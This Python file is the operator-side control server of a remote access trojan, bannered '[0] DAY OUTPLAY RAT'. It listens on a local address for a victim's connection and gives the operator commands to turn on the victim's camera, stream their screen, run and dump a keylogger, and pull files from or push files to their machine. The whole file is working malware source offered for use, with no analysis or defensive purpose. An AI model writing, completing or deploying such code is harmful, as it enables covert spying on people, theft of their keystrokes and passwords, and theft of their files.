import socket
import json
import os
from vidstream import StreamingServer
import platform
import base64
import sys




IP = "10.0.10.8"
PORT = 7007

reserved_ports = [21, 20, 22, 23, 80, 8080, 7007, 443]

cam_ports = [p for p in range(1, 65536) if p not in reserved_ports]

cam_ind = 0


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((IP, PORT))
sock.listen(5)



def banner():
        print("""
███╗ ██████╗ ███╗    ██████╗  █████╗ ██╗   ██╗     ██████╗ ██╗   ██╗████████╗██████╗ ██╗      █████╗ ██╗   ██╗
██╔╝██╔═████╗╚██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔═══██╗██║   ██║╚══██╔══╝██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝
██║ ██║██╔██║ ██║    ██║  ██║███████║ ╚████╔╝     ██║   ██║██║   ██║   ██║   ██████╔╝██║     ███████║ ╚████╔╝ 
██║ ████╔╝██║ ██║    ██║  ██║██╔══██║  ╚██╔╝      ██║   ██║██║   ██║   ██║   ██╔═══╝ ██║     ██╔══██║  ╚██╔╝  
███╗╚██████╔╝███║    ██████╔╝██║  ██║   ██║       ╚██████╔╝╚██████╔╝   ██║   ██║     ███████╗██║  ██║   ██║   
╚══╝ ╚═════╝ ╚══╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝        ╚═════╝  ╚═════╝    ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   
                                                                                                                


                                        ██████╗  █████╗ ████████╗
                                        ██╔══██╗██╔══██╗╚══██╔══╝
                                        ██████╔╝███████║   ██║   
                                        ██╔══██╗██╔══██║   ██║   
                                        ██║  ██║██║  ██║   ██║   
                                        ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                         
        \n\n\n""")


def help():
        print(
"""
        open_cam           <==>    Open the target Camera

        close_cam          <==>    Close the target Camera

        screen_share_on    <==>    Share the target's screen

        screen_share_off    <==>    Close Screen Sharing

        start_kl           <==>    Start the KeyLogger

        stop_kl            <==>    Stop the KeyLogger

        dump_ks            <==>    Print the Captured KeyStrokes 

        save_ks            <==>    Save Captured KeyStrokes

        download           <==>    Download the specified File from the target

        upload             <==>    Upload the specified File to the target

        quit               <==>    Exit the Program
""") 



def clear_terminal():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear") 



def reliable_recv():
    json_data = ""
    while 1:
        try:
            json_data += vic_sock.recv(1024).decode().rstrip()
            return json.loads(json_data)
        except ValueError:
            continue


def reliable_send(data):
    json_data = json.dumps(data)
    vic_sock.send(json_data.encode())


def open_cam_sreen():
    cam_server.start_server()

def close_cam_screen():
    cam_server.stop_server()


def download_file(file, content):
    content = base64.b64decode(content).decode()
    location = input("\n[+] Please Enter the location to save the file in : ")
    try:
        open(location + file, "wb").write(content.encode())
        print("\n[+] File Downloaded Successfully.\n")
    except FileNotFoundError:
        print("\n[!] Invalid Location.\n")


def upload_file(file):
    try:
        u_file = open(file, "rb")
        return base64.b64encode(u_file.read()).decode()
    except FileNotFoundError:
        return "[!] File Not Found."


def save_ks(content):
    location = input("\n[+] Enter the Filename to store KeyStrokes on it : ")
    open(location+".txt", "w").write(content)
    return "[+] KeyStrokes Had Been Successfully Saved on ./" + location + ".txt"





while 1:
    banner()
    print("[+] Listening for Incomming Connecion ...")


    vic_sock, vic_addr = sock.accept()

    while 1:
        
        cmd = input("Enter Command > ").split()
        if cmd == []:
            continue
        command = cmd[0].lower()
        if command == "help":
            help()
            continue
        if command == "cls" or command == "clear":
            clear_terminal()
            continue
        if command == "open_cam":
            cam_ind+=1
            cam_port = cam_ports[cam_ind]
            cam_port %= len(cam_ports)
            cmd.append(cam_port)
            cam_server = StreamingServer(IP, 8888)
            open_cam_sreen()
        elif command == "screenshare":
            cam_server = StreamingServer(IP, 7890)
            open_cam_sreen()
        elif command == "upload" and len(cmd) == 2: # Add Prompt for location 
            content = upload_file(cmd[1])
            if content == "[!] File Not Found.":
                print(content)
                continue
            cmd.append(content)
        reliable_send(cmd)
        if command == "close_cam" or command == "screenshare_off":
            close_cam_screen()
        elif command == "quit":
            print("\n[+] Bye.\n")
            sock.close()
            sys.exit()   
        elif command == "download" and len(cmd) == 2:
            recv_dwn = reliable_recv()
            if recv_dwn == "[!] File Not Found.":
                print(recv_dwn)
            else:
                download_file(cmd[1], recv_dwn)
            continue
        response = reliable_recv()
        if command == "save_ks" and len(cmd) == 1:
            response = save_ks(response)

        print("\n" + response + "\n")
        if response == "[+] KeyLogger Stopped.":
            break